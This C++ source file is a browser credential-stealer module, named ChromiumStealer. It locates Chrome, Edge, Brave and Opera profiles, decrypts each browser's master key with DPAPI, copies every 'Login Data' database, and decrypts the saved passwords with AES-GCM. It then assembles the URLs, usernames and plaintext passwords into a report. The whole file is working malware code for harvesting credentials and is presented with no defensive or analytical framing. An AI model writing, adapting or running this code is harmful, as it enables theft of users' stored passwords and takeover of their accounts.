#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                std::ifstream f(localStatePath);
                if (!f.is_open()) return {};
                nlohmann::json j;
                f >> j;

                std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);

                // Remove DPAPI prefix (5 bytes)
                if (encryptedKey.size() < 5) return {};
                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());

                DATA_BLOB in;
                in.pbData = dpapiEncryptedKey.data();
                in.cbData = (DWORD)dpapiEncryptedKey.size();
                DATA_BLOB out;

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    return masterKey;
                }
            } catch (...) {
            }
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
            try {
                // Ciphertext structure: v10 (3 bytes) + IV (12 bytes) + EncryptedData + Tag (16 bytes)
                if (ciphertext.size() < 3 + 12 + 16) return "";

                // Check version
                if (ciphertext[0] != 'v' || ciphertext[1] != '1' || ciphertext[2] != '0') return "";

                std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                std::vector<BYTE> encryptedData(ciphertext.begin() + 15, ciphertext.end() - 16); // Data without tag
                
                std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());

                crypto::AesGcm aes(masterKey);
                std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
                return std::string(decrypted.begin(), decrypted.end());
            } catch (...) {
                return "";
            }
        }
    }

    std::string DumpChromiumPasswords() {
        std::string report = "BROWSER_CREDENTIALS:\n";
        report += "URL                                      USERNAME             PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            std::string localAppData(path);
            
            struct BrowserPath {
                std::string name;
                std::string userDataPath;
            };

            std::vector<BrowserPath> browsers = {
                {"Chrome", localAppData + "\\Google\\Chrome\\User Data"},
                {"Edge", localAppData + "\\Microsoft\\Edge\\User Data"},
                {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"},
                {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"}
            };

            for (const auto& browser : browsers) {
                if (!fs::exists(browser.userDataPath)) continue;

                std::string localState = browser.userDataPath + "\\Local State";
                std::vector<BYTE> key = GetMasterKey(localState);
                if (key.empty()) continue;

                // Recursively find "Login Data" to catch all profiles
                try {
                    for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                        const auto& entry = *it;
                        if (entry.path().filename() == "Login Data") {
                            std::string loginData = entry.path().string();
                            
                            // Copy to temp to avoid locks
                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "temp_login_db_" + browser.name + "_" + std::to_string(GetTickCount());
                            CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);

                            sqlite3* db;
                            if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
                                const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                                        if (!url_ptr || !user_ptr) continue;

                                        std::string url = url_ptr;
                                        std::string username = user_ptr;
                                        const void* blob = sqlite3_column_blob(stmt, 2);
                                        int blobLen = sqlite3_column_bytes(stmt, 2);
                                        
                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string password = DecryptPassword(encryptedPass, key);

                                            if (!password.empty() && !username.empty()) {
                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                }
                                sqlite3_close(db);
                            }
                            DeleteFileA(tempDb.c_str());
                        }
                        // Limit depth to avoid scanning everything
                        if (it.depth() > 3) it.disable_recursion_pending();
                    }
                } catch (...) {}
            }
        }

        return report;
    }

}
